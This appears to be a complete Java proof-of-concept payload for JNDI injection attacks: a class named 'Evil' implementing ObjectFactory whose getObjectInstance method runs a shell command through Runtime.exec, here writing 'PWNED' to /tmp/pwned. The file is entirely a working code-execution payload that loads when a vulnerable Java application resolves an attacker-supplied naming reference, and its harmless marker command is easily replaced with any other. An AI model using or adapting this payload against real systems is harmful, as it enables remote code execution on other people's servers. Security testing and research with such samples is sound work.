import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public  class Evil implements  ObjectFactory  {
    @Override
    public Object getObjectInstance (Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment)  throws Exception {
        String[] cmd = {
            "/bin/sh",
            "-c",
            "echo PWNED > /tmp/pwned"
        };
        Runtime.getRuntime().exec(cmd);
        return  null;
    }
}
